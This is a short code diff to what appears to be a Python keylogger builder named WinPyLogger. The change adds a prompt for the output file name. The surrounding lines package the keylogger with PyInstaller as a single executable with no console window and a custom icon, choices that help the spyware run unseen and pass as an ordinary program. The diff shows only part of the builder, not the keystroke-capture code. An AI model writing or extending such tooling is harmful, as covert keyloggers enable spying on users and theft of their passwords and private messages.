@@ -49,6 +49,7 @@ try:
             print('The keylogger is saved in WinPyLogger/dist')
         elif command_2 == 'n':
             path = input('path of .ico file> ')
+            name_keylogger = input("Name the keylogger file (don't mention the extension): ")
             keylogger_generate = f'pyinstaller --onefile utils.py --noconsole --icon={path} --name {name_keylogger}'
             os.system(keylogger_generate) 
             print(greeting)
